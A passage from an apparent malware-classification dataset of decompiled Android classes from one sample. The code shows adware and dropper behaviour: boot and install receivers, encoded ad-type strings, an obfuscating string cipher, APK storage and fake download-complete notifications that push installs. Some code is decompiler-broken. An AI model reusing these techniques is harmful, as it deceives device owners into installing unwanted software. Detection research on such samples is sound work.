context,  com.baty.dasy.resy.cac.c.a aVar){     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(8),0);     if (aVar.e == -1) {       return false;     }     SharedPreferences.Editor edit=sharedPreferences.edit();     if (!sharedPreferences.contains("""" + aVar.e)) {       edit.putString("""" + aVar.e,aVar.c());     }     return edit.commit();   }   public static String e(  Context context){     String string=context.getSharedPreferences(a.a(5),0).getString(a.a(4),null);     return !TextUtils.isEmpty(string) ? string : c(context,a.a(4));   }   private static String e(  String str){     return str.substring(0,str.indexOf(""."")) + a.a(68);   }   public static boolean e(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     com.baty.dasy.resy.cac.c.a[] i;     if (aVar == null) {       return false;     }     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(7),0);     String str="""" + aVar.e;     if (!sharedPreferences.contains(str) || (i=i(context)) == null) {       return false;     }     for (    com.baty.dasy.resy.cac.c.a aVar2 : i) {       if (aVar2.e == aVar.e) {         if (aVar2.x == 4 || aVar2.x >= aVar.x) {           return false;         }         SharedPreferences.Editor edit=sharedPreferences.edit();         edit.remove(str);         edit.putString(str,aVar.c());         a(context,aVar.e,aVar.x);         return edit.commit();       }     }     return false;   }   public static boolean e(  Context context,  String str){     Intent d2=d(context,str);     if (d2 == null) {       return false;     }     context.startActivity(d2);     return true;   }   public static com.baty.dasy.resy.cac.c.a f(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     com.baty.dasy.resy.cac.c.a[] i=i(context);     if (i == null || i.length <= 0) {       return null;     }     for (    com.baty.dasy.resy.cac.c.a aVar : i) {       if (str.equals(aVar.b)) {         return aVar;       }     }     return null;   }   public static String f(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static boolean f(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     com.baty.dasy.resy.cac.c.a[] j;     if (aVar == null) {       return false;     }     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(8),0);     String str="""" + aVar.e;     if (!sharedPreferences.contains(str) || (j=j(context)) == null) {       return false;     }     for (    com.baty.dasy.resy.cac.c.a aVar2 : j) {       if (aVar2.e == aVar.e) {         if (aVar2.x == 4 || aVar2.x >= aVar.x) {           return false;         }         SharedPreferences.Editor edit=sharedPreferences.edit();         edit.remove(str);         edit.putString(str,aVar.c());         b(context,aVar.e,aVar.x);         return edit.commit();       }     }     return false;   }   public static com.baty.dasy.resy.cac.c.a g(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     List<com.baty.dasy.resy.cac.c.a> q=q(context);     if (q == null || q.size() <= 0) {       return null;     }     for (    com.baty.dasy.resy.cac.c.a aVar : q) {       if (str.equals(aVar.f)) {         return aVar;       }     }     return null;   }   public static String g(  Context context){     String stringBuffer; synchronized (f) {       StringBuffer stringBuffer2=new StringBuffer();       SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(12),0);       for (      String str : sharedPreferences.getAll().keySet()) {         for (        String str2 : a(sharedPreferences.getString(str,""""),"","")) {           stringBuffer2.append(str + "","" + str2+ "";"");         }       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.clear();       edit.commit();       f.a(""state log 2 "" + stringBuffer2.toString());       stringBuffer=stringBuffer2.toString();     }     return stringBuffer;   }   public static synchronized boolean g(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     boolean z=false; synchronized (d.class) {       SharedPreferences.Editor edit=context.getSharedPreferences(a.a(10),0).edit();       if (edit.commit()) {         edit.putString("""" + aVar.e,aVar.c());         if (edit.commit()) {           z=true;         }       }     }     return z;   }   public static com.baty.dasy.resy.cac.c.a h(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     List<com.baty.dasy.resy.cac.c.a> r=r(context);     if (r == null || r.size() <= 0) {       return null;     }     for (    com.baty.dasy.resy.cac.c.a aVar : r) {       if (str.equals(aVar.f)) {         return aVar;       }     }     return null;   }   public static String h(  Context context){     String stringBuffer; synchronized (f) {       StringBuffer stringBuffer2=new StringBuffer();       SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(9),0);       for (      String str : sharedPreferences.getAll().keySet()) {         for (        String str2 : a(sharedPreferences.getString(str,""""),"","")) {           stringBuffer2.append(str + "","" + str2+ "";"");         }       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.clear();       edit.commit();       stringBuffer=stringBuffer2.toString();     }     return stringBuffer;   }   public static synchronized boolean h(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     boolean z=false; synchronized (d.class) {       SharedPreferences.Editor edit=context.getSharedPreferences(a.a(11),0).edit();       if (edit.commit()) {         edit.putString("""" + aVar.e,aVar.c());         if (edit.commit()) {           z=true;         }       }     }     return z;   }   public static com.baty.dasy.resy.cac.c.a i(  Context context,  String str){     if (str == null || str.trim().equals("""")) {       return null;     }     com.baty.dasy.resy.cac.c.a[] j=j(context);     if (j == null || j.length <= 0) {       return null;     }     for (    com.baty.dasy.resy.cac.c.a aVar : j) {       if (str.equals(aVar.b)) {         return aVar;       }     }     return null;   }   public static void i(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     SharedPreferences.Editor edit=context.getSharedPreferences(a.a(10),0).edit();     edit.putString("""" + aVar.e,aVar.c());     edit.remove("""" + aVar.e);     edit.commit();   }   public static com.baty.dasy.resy.cac.c.a[] i(  Context context){     int i=0;     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(7),0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     com.baty.dasy.resy.cac.c.a[] aVarArr=new com.baty.dasy.resy.cac.c.a[all.size()];     while (true) {       int i2=i;       if (!it.hasNext()) {         return aVarArr;       }       String next=it.next();       String string=sharedPreferences.getString(next,null);       com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();       if (!aVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       aVar.e=Integer.valueOf(next).intValue();       i=i2 + 1;       aVarArr[i2]=aVar;     }   }   public static void j(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     SharedPreferences.Editor edit=context.getSharedPreferences(a.a(11),0).edit();     edit.putString("""" + aVar.e,aVar.c());     edit.remove("""" + aVar.e);     edit.commit();   }   public static boolean j(  Context context,  String str){     Iterator<PackageInfo> it=context.getPackageManager().getInstalledPackages(0).iterator();     while (it.hasNext()) {       if (str.equals(it.next().packageName)) {         return true;       }     }     return false;   }   public static com.baty.dasy.resy.cac.c.a[] j(  Context context){     int i=0;     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(8),0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     com.baty.dasy.resy.cac.c.a[] aVarArr=new com.baty.dasy.resy.cac.c.a[all.size()];     while (true) {       int i2=i;       if (!it.hasNext()) {         return aVarArr;       }       String next=it.next();       String string=sharedPreferences.getString(next,null);       com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();       if (!aVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       aVar.e=Integer.valueOf(next).intValue();       i=i2 + 1;       aVarArr[i2]=aVar;     }   }   private static void k(  Context context,  String str){     if (str == null) {       return;     }     context.getSharedPreferences(a.a(2),0).edit().putString(""i"",a(str)).commit();   }   public static boolean k(  Context context){     String c2=c(a.a(6) + a.a(71));     if (c2 == null) {       l(context);       return false;     }     long currentTimeMillis=System.currentTimeMillis() - Long.valueOf(c2).longValue();     if (currentTimeMillis < 0) {       l(context);       return false;     }     if (currentTimeMillis <= 604800000) {       return false;     }     a();     l(context);     return true;   }   public static boolean l(  Context context){     return b(a.a(6) + a.a(71),String.valueOf(System.currentTimeMillis()));   }   public static int m(  Context context){     return ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getWidth();   }   public static int n(  Context context){     return ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getHeight();   }   public static void o(  Context context){     com.baty.dasy.resy.cac.c.a[] i=i(context);     if (i == null) {       return;     }     for (    com.baty.dasy.resy.cac.c.a aVar : i) {       if (aVar.x == 3) {         File a2=j.a(context,aVar);         if (a2.exists() && !j(context,aVar.f)) {           q.a(context,new Notification(R.drawable.stat_sys_download_done,"""",System.currentTimeMillis()),a.a(50),aVar.e,32,a(context,a2,aVar),aVar.d,-1);         }       }     }     com.baty.dasy.resy.cac.c.a[] j=j(context);     if (j != null) {       for (      com.baty.dasy.resy.cac.c.a aVar2 : j) {         if (aVar2.x == 3) {           File a3=j.a(context,aVar2);           if (a3.exists() && !j(context,aVar2.f)) {             q.a(context,new Notification(R.drawable.stat_sys_download_done,"""",System.currentTimeMillis()),a.a(50),aVar2.e,32,a(context,a3,aVar2),aVar2.d,-1);           }         }       }     }   }   public static void p(  Context context){ synchronized (f36c) {       if (((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo() != null) {         com.baty.dasy.resy.cac.b.c a2=com.baty.dasy.resy.cac.b.c.a();         if (a2 == null) {           a2=com.baty.dasy.resy.cac.b.c.a(context);         }         List<com.baty.dasy.resy.cac.b.g> d2=a2.d();         if (d2 != null) {           for (          com.baty.dasy.resy.cac.b.g gVar : d2) {             if (gVar.m() != 0) {               com.baty.dasy.resy.cac.c.a f2=f(context,gVar.n());               if (f2 != null) {                 if (!k.a(f2)) {                   gVar.a((com.baty.dasy.resy.cac.b.b)new com.baty.dasy.resy.cac.b.a(context,f2,null));                   gVar.f();                 }               }               com.baty.dasy.resy.cac.c.a i=i(context,gVar.n());               if (i != null && !k.a(i)) {                 gVar.a((com.baty.dasy.resy.cac.b.b)new com.baty.dasy.resy.cac.b.a(context,i,null));                 gVar.f();               }             }           }         }       }     }   }   private static List q(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(10),0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     ArrayList arrayList=new ArrayList();     while (it.hasNext()) {       String string=sharedPreferences.getString(it.next(),null);       com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();       if (!aVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       try {         arrayList.add(aVar);       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     return arrayList;   }   private static List r(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(11),0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.size() <= 0) {       return null;     }     Iterator<String> it=all.keySet().iterator();     ArrayList arrayList=new ArrayList();     while (it.hasNext()) {       String string=sharedPreferences.getString(it.next(),null);       com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();       if (!aVar.a(string)) {         sharedPreferences.edit().clear().commit();         return null;       }       try {         arrayList.add(aVar);       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     return arrayList;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\e.code","public class e {   private static int[] a={74,29,39,41,46,70,9,37,82,78,82,26,43,31,9,12,93,72,74,12,20,92,33,8,17,30,77,85,67,65,75,23,82,61,1,83,7,24,84,79,10,71,71,65,11,54,95,37,77,14,81,10,60,58,95,61,88,92,71,78,35,91,9,52,45,59,41,19,66,35,0,78,68,68,6,21,97,33,33,64,12,78,47,7,21,36,38,20,82,16,7,47,7,44,58,16,40,43,55,35,48,63,44,78,32,83,25,18,74,83,62,40,40,68,18,79,10,34,31,23,77,78,24,94,24,13,0,45,88,9,1,59,56,95,85,0,70,84,15,60,55,49,60,15,68,18,59,62,4,60,91,29,57,9,99,64,46,85,17,28,78,27,20,85,71,41,4,5,64,83,55,35,27,11,31,16,73,96,22,92,71,9,89,48,99,99,9,63,64,39,89,26,42,43,70,29,65,47,24,27};   public static String a(  String str){     if (str == null) {       return """";     }     StringBuilder sb=new StringBuilder();     sb.append(""s"");     char[] charArray=str.toCharArray();     for (int i=0; i < charArray.length; i++) {       try {         sb.append((char)(charArray[i] + a[i % a.length]));       }  catch (      Exception e) {         e.printStackTrace();       }     }     sb.append(""e"");     return sb.toString();   }   public static String b(  String str){     if (str == null || !str.startsWith(""s"") || !str.endsWith(""e"")) {       return """";     }     StringBuilder sb=new StringBuilder(str);     sb.deleteCharAt(0);     sb.deleteCharAt(sb.length() - 1);     char[] charArray=sb.toString().toCharArray();     StringBuilder sb2=new StringBuilder();     for (int i=0; i < charArray.length; i++) {       try {         sb2.append((char)(charArray[i] - a[i % a.length]));       }  catch (      Exception e) {         e.printStackTrace();       }     }     return sb2.toString();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\f.code","public class f {   public static void a(  Object obj){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\g.code","public class g {   public Rect a=new Rect();   public int[] b;   public int[] f37c;   public int[] d;   public static g a(  byte[] bArr){     ByteBuffer order=ByteBuffer.wrap(bArr).order(ByteOrder.nativeOrder());     if (order.get() == 0) {       return null;     }     g gVar=new g();     gVar.b=new int[order.get()];     gVar.f37c=new int[order.get()];     gVar.d=new int[order.get()];     a(gVar.b.length);     a(gVar.f37c.length);     order.getInt();     order.getInt();     gVar.a.left=order.getInt();     gVar.a.right=order.getInt();     gVar.a.top=order.getInt();     gVar.a.bottom=order.getInt();     order.getInt();     a(gVar.b,order);     a(gVar.f37c,order);     a(gVar.d,order);     return gVar;   }   private static void a(  int i){     if (i == 0 || (i & 1) != 0) {       throw new RuntimeException("":"" + i);     }   }   private static void a(  int[] iArr,  ByteBuffer byteBuffer){     int length=iArr.length;     for (int i=0; i < length; i++) {       iArr[i]=byteBuffer.getInt();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\h.code","public class h {   private static int a;   private static Map b=new HashMap();   private static Map f38c=new HashMap();   private static int d=-1;   private static int e=-1;   private static int a(  Context context){     if (a == 0) {       int i=context.getResources().getDisplayMetrics().densityDpi;       a=(int)((i * i) / 240.0f);     }     return a;   }   public static Bitmap a(  Context context,  int i,  int i2){     e=i;     e=i2;     Bitmap bitmap=(Bitmap)com.baty.dasy.resy.cac.a.b.a(context).a((Object)a(9999));     if (bitmap != null) {       return bitmap;     }     try {       Bitmap createBitmap=Bitmap.createBitmap(i,i2,Bitmap.Config.ARGB_8888);       f38c.put(9999,createBitmap);       return createBitmap;     }  catch (    OutOfMemoryError e2) {       e2.printStackTrace();       System.gc();       return null;     }   }   public static Drawable a(  Context context,  int i){     if (f38c.containsKey(Integer.valueOf(i))) {       return a(context,(Bitmap)f38c.get(Integer.valueOf(i)));     }     Bitmap e2=e(context,i);     if (e2 != null) {       return a(context,e2);     }     return null;   }   public static Drawable a(  Context context,  Bitmap bitmap){     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     bitmapDrawable.setTargetDensity(a(context));     return bitmapDrawable;   }   private static String a(  int i){     String str="""" + i;     int length=4 - str.length();     StringBuilder sb=new StringBuilder();     for (int i2=0; i2 < length; i2++) {       sb.append(""0"");     }     sb.append(str).append("".png"");     return sb.toString();   }   private static void a(  byte[] bArr){     BufferedReader bufferedReader=new BufferedReader(new StringReader(new String(bArr,""utf-8"")));     while (true) {       String readLine=bufferedReader.readLine();       if (TextUtils.isEmpty(readLine)) {         return;       }       if (readLine.contains(""="") && !readLine.startsWith(""#"")) {         int indexOf=readLine.indexOf(""="");         b.put(Integer.valueOf(readLine.substring(0,indexOf)),readLine.substring(indexOf + 1));       }     }   }   public static Bitmap b(  Context context,  int i){     return f38c.containsKey(Integer.valueOf(i)) ? (Bitmap)f38c.get(Integer.valueOf(i)) : e(context,i);   }   public static Drawable c(  Context context,  int i){     try {       Bitmap bitmap=(Bitmap)f38c.get(Integer.valueOf(i));       Bitmap e2=bitmap == null ? e(context,i) : bitmap;       byte[] ninePatchChunk=e2.getNinePatchChunk();       if (!NinePatch.isNinePatchChunk(ninePatchChunk)) {         return null;       }       Rect rect=new Rect();       NinePatchDrawable ninePatchDrawable=new NinePatchDrawable(e2,ninePatchChunk,g.a(ninePatchChunk).a,null);       ninePatchDrawable.getPadding(rect);       ninePatchDrawable.setTargetDensity(a(context));       return ninePatchDrawable;     }  catch (    Exception e3) {       e3.printStackTrace();       return null;     }   }   public static String d(  Context context,  int i){     if (b.size() == 0) {       try {         InputStream open=context.getAssets().open(""mym"");         DataInputStream dataInputStream=new DataInputStream(open);         while (true) {           int readInt=dataInputStream.readInt();           if (readInt == -1) {             break;           }           int readInt2=dataInputStream.readInt();           if (readInt == 2) {             byte[] bArr=new byte[readInt2];             dataInputStream.read(bArr,0,readInt2);             a(bArr);             break;           }           dataInputStream.skipBytes(readInt2);         }         open.close();       }  catch (      Exception e2) {       }     }     return (String)b.get(Integer.valueOf(i));   }   private static Bitmap e(  Context context,  int i){     int i2=0;     try {       InputStream open=context.getAssets().open(""mym"");       DataInputStream dataInputStream=new DataInputStream(open);       while (true) {         int readInt=dataInputStream.readInt();         if (readInt == -1) {           break;         }         int readInt2=dataInputStream.readInt();         if (readInt == 1) {           do {             int readInt3=dataInputStream.readInt();             int readInt4=dataInputStream.readInt();             if (readInt3 == i) {               byte[] bArr=new byte[readInt4];               dataInputStream.read(bArr,0,readInt4);               Bitmap decodeByteArray=BitmapFactory.decodeByteArray(bArr,0,readInt4);               f38c.put(Integer.valueOf(i),decodeByteArray);               return decodeByteArray;             }             dataInputStream.skip(readInt4);             i2=i2 + 4 + 4+ readInt4;           }  while (readInt2 > i2);         }  else {           dataInputStream.skipBytes(readInt2);         }       }       open.close();     }  catch (    Exception e2) {     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\i.code","public class i {   private static Map a=new HashMap();   private static Map b=new HashMap();   private static int f39c;   public static Bitmap a(  Context context,  String str){     Bitmap b2;     if ((!a.containsKey(str) || (b2=(Bitmap)((SoftReference)a.get(str)).get()) == null) && (b2=b(context,str)) != null) {       a.put(str,new SoftReference(b2));     }     return b2;   }   public static Drawable a(  Context context,  Bitmap bitmap){     if (f39c == 0) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       f39c=displayMetrics.densityDpi;     }     BitmapDrawable bitmapDrawable=new BitmapDrawable(bitmap);     bitmapDrawable.setTargetDensity((int)(f39c * ((f39c * 1.0f) / 240.0f)));     return bitmapDrawable;   }   public static android.graphics.Bitmap b(  android.content.Context r4,  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.j.i.b(android.content.Context, java.lang.String):android.graphics.Bitmap"");   }   public static Drawable c(  Context context,  String str){     Drawable drawable;     if (b.containsKey(str) && (drawable=(Drawable)((SoftReference)b.get(str)).get()) != null) {       return drawable;     }     Bitmap b2=b(context,str);     if (b2 == null) {       return null;     }     Drawable a2=a(context,b2);     b.put(str,new SoftReference(a2));     return a2;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\j.code","public class j {   private static File a(){     File file=new File(Environment.getExternalStorageDirectory(),a.a(6));     if (b(file) || file.mkdirs()) {       return file;     }     return null;   }   public static File a(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     return new File(context.getDir(""apk"",0),d(aVar));   }   public static File a(  com.baty.dasy.resy.cac.c.a aVar){     File c2=c(aVar);     if (c2 == null) {       return null;     }     return new File(c2,""f"");   }   public static boolean a(  File file){     File parentFile=file.getParentFile();     if (parentFile.exists() && parentFile.isDirectory()) {       return true;     }     return parentFile.mkdirs();   }   public static File b(  com.baty.dasy.resy.cac.c.a aVar){     File c2=c(aVar);     if (c2 == null) {       return null;     }     File file=new File(c2,d(aVar));     a(file);     return file;   }   public static boolean b(  File file){     return file.exists() && file.isDirectory();   }   private static File c(  com.baty.dasy.resy.cac.c.a aVar){     File a=a();     if (a == null) {       return null;     }     File file=new File(a,"""" + aVar.e);     if (file.exists() && !file.isFile()) {       return file;     }     file.mkdir();     return file;   }   private static String d(  com.baty.dasy.resy.cac.c.a aVar){     String str=aVar.b;     return aVar.e + ""_"" + aVar.j+ ""_""+ str.substring(str.lastIndexOf(""/"") + 1,str.length()).replace(""?"","""");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\k.code","public class k {   public static void a(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     FileOutputStream fileOutputStream;     File a=j.a(aVar);     if (a == null) {       return;     }     try {       fileOutputStream=new FileOutputStream(a);       try {         try {           BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));           bufferedWriter.write(""1,"" + context.getPackageName());           bufferedWriter.flush();           a(fileOutputStream);         }  catch (        Exception e) {           e=e;           e.printStackTrace();           a(fileOutputStream);         }       }  catch (      Throwable th) {         th=th;         a(fileOutputStream);         throw th;       }     }  catch (    Exception e2) {       e=e2;       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       fileOutputStream=null;       a(fileOutputStream);       throw th;     }   }   public static void a(  File file,  File file2){     FileInputStream fileInputStream;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     fileOutputStream2=null;     FileInputStream fileInputStream2=null;     if (!file.getName().equals(file2.getName()) || file.length() <= file2.length()) {       return;     }     if (file2.exists()) {       file2.delete();     }     byte[] bArr=new byte[1024];     try {       fileInputStream=new FileInputStream(file);       try {         fileOutputStream=new FileOutputStream(file2);         while (true) {           try {             int read=fileInputStream.read(bArr);             if (read == -1) {               a(fileInputStream);               a(fileOutputStream);               return;             }             fileOutputStream.write(bArr,0,read);           }  catch (          Exception e) {             e=e;             fileInputStream2=fileInputStream;             try {               e.printStackTrace();               a(fileInputStream2);               a(fileOutputStream);               return;             }  catch (            Throwable th) {               th=th;               fileInputStream=fileInputStream2;               fileOutputStream2=fileOutputStream;               a(fileInputStream);               a(fileOutputStream2);               throw th;             }           } catch (          Throwable th2) {             th=th2;             fileOutputStream2=fileOutputStream;             a(fileInputStream);             a(fileOutputStream2);             throw th;           }         }       }  catch (      Exception e2) {         e=e2;         fileOutputStream=null;         fileInputStream2=fileInputStream;       } catch (      Throwable th3) {         th=th3;       }     }  catch (    Exception e3) {       e=e3;       fileOutputStream=null;     } catch (    Throwable th4) {       th=th4;       fileInputStream=null;     }   }   private static void a(  InputStream inputStream){     if (inputStream != null) {       try {         inputStream.close();       }  catch (      Exception e) {       }     }   }   private static void a(  OutputStream outputStream){     if (outputStream != null) {       try {         outputStream.close();       }  catch (      Exception e) {       }     }   }   public static boolean a(  com.baty.dasy.resy.cac.c.a aVar){     String b=b(aVar);     return !TextUtils.isEmpty(b) && Integer.valueOf(b.split("","")[0]).intValue() == 1;   }   private static String b(  com.baty.dasy.resy.cac.c.a aVar){     FileInputStream fileInputStream;     String str=null;     File a=j.a(aVar);     if (a != null) {       exists=a.exists();       try {         if (exists != 0) {           try {             fileInputStream=new FileInputStream(a);             try {               str=new BufferedReader(new InputStreamReader(fileInputStream)).readLine();               a(fileInputStream);               exists=fileInputStream;             }  catch (            Exception e) {               e=e;               e.printStackTrace();               a(fileInputStream);               exists=fileInputStream;               return str;             }           }  catch (          Exception e2) {             e=e2;             fileInputStream=null;           } catch (          Throwable th) {             exists=0;             th=th;             a((InputStream)exists);             throw th;           }         }       }  catch (      Throwable th2) {         th=th2;       }     }     return str;   }   public static void b(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     String b;     FileOutputStream fileOutputStream;     File a=j.a(aVar);     if (a == null || (b=b(aVar)) == null || !b.startsWith(""1"")) {       return;     }     String[] split=b.split("","");     if (split.length == 2 && !split[1].equals(context.getPackageName())) {       return;     }     try {       fileOutputStream=new FileOutputStream(a);       try {         try {           BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));           bufferedWriter.write(""0"");           bufferedWriter.flush();           a(fileOutputStream);         }  catch (        Exception e) {           e=e;           e.printStackTrace();           a(fileOutputStream);         }       }  catch (      Throwable th) {         th=th;         a(fileOutputStream);         throw th;       }     }  catch (    Exception e2) {       e=e2;       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       fileOutputStream=null;       a(fileOutputStream);       throw th;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\l.code","public class l {   private static HashSet a=new HashSet();   private static boolean b; static {     a.add(a.a(401));     a.add(a.a(402));     a.add(a.a(403));     a.add(a.a(404));     a.add(a.a(405));     a.add(a.a(406));     a.add(a.a(407));     a.add(a.a(408));     a.add(a.a(409));     a.add(a.a(410));     a.add(a.a(411));     a.add(a.a(412));     a.add(a.a(413));     a.add(a.a(414));     a.add(a.a(415));     a.add(a.a(416));     if (a.contains(com.baty.dasy.resy.cac.h.a())) {       b=true;     }   }   private static String a(){     return h.d(com.baty.dasy.resy.cac.h.a,301);   }   public static void a(  Class cls,  Object obj){   }   public static void a(  Object obj){     if (b) {       Log.i(""DEBUG"",a() + (obj != null ? obj.toString() : ""null""));     }   }   public static void a(  Object obj,  Object obj2){     a((Class)obj.getClass(),obj2);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\a.code","public interface a { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\b.code","public class b {   public static final byte[] b={116,121,112,101,95,102,111,114,95,97,108,97,114,109};   public static final byte[] d={116,121,112,101,95,99,108,105,99,107,95,97,100,95,110,111,116,105,102,105,99,97,116,105,111,110};   public static final byte[] f={116,121,112,101,95,99,108,105,99,107,95,112,114,111,103,114,101,115,115,95,100,111,119,110,108,111,97,100,105,110,103};   public static final byte[] h={116,121,112,101,95,99,108,105,99,107,95,112,114,111,103,114,101,115,115,95,100,111,119,110,108,111,97,100,95,102,105,110,105,115,104,101,100};   public static String a=com.baty.pczy.facy.pap.s.a.a(b);   public static String f45c=com.baty.pczy.facy.pap.s.a.a(d);   public static String e=com.baty.pczy.facy.pap.s.a.a(f);   public static String g=com.baty.pczy.facy.pap.s.a.a(h);   public static void a(  BroadcastReceiver broadcastReceiver,  Context context,  Intent intent){     com.baty.pczy.facy.pap.l.b bVar=null;     if (e.a(context,b.class,null,null) == null) {       return;     }     String action=intent.getAction();     if (""android.intent.action.BOOT_COMPLETED"".equals(action)) {       bVar=new com.baty.pczy.facy.pap.l.a(context,intent);     }  else     if (""android.intent.action.PACKAGE_ADDED"".equals(action)) {       String uri=intent.getData().toString();       bVar=new com.baty.pczy.facy.pap.l.e(context,uri.substring(com.baty.pczy.facy.pap.p.a.cN.length(),uri.length()),h.Type_Real_Time);     }  else     if (action == null) {       intent.getType();     }  else     if (""android.net.conn.CONNECTIVITY_CHANGE"".equals(action)) {       bVar=new com.baty.pczy.facy.pap.l.c(context,intent);     }  else     if (""android.intent.action.USER_PRESENT"".equals(action)) {       bVar=new i(context,intent);     }     if (bVar != null) {       bVar.a();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\brua.code","public class brua extends Activity implements a {   @Override public void onBackPressed(){     d.e(this);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     d.a(this,bundle);   }   @Override protected void onNewIntent(  Intent intent){     super.onNewIntent(intent);     d.c(this,intent);   }   @Override protected void onResume(){     super.onResume();     d.b(this);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap\c.code","public class c {   private static byte[] g={97,100,105,100};   private static final byte[] h={116,121,112,101,95,97,108,97,114,109,95,115,101,114,118,105,101};   private static final byte[] i={116,121,112,101,95,99,108,105,99,107,95,97,100};   private static final byte[] j={116,121,112,101,95,100,111,119,110,108,111,97,100,105,110,103};   private static final byte[] k={116,121,112,101,95,100,111,110,119,108,111,97,100,95,102,105,110,105,115,104,101,100};   private static final byte[] l={116,121,112,101,95,114,101,113,117,101,115,116,95,97,100};   public static String b=com.baty.pczy.facy.pap.s.a.a(h);   public static String f50c=com.baty.pczy.facy.pap.s.a.a(i);   public static String d=com.baty.pczy.facy.pap.s.a.a(j);   public static String e=com.baty.pczy.facy.pap.s.a.a(k);   public static String f=com.baty.pczy.facy.pap.s.a.a(l);   public static final String a=com.baty.pczy.facy.pap.s.a.a(g);   public static void b(  Service service,  Intent intent){     com.baty.pczy.facy.pap.n.d dVar=null;     if (intent == null || e.a(service,c.class,null,null) == null) {       return;     }     String type=intent.getType();     if (b.equals(type)) {       if (!com.baty.pczy.facy.pap.f.a.a(service)) {         return;       }  else {         dVar=new com.baty.pczy.facy.pap.n.e(service,intent);       }     }  else     if (f50c.equals(type)) {       dVar=new 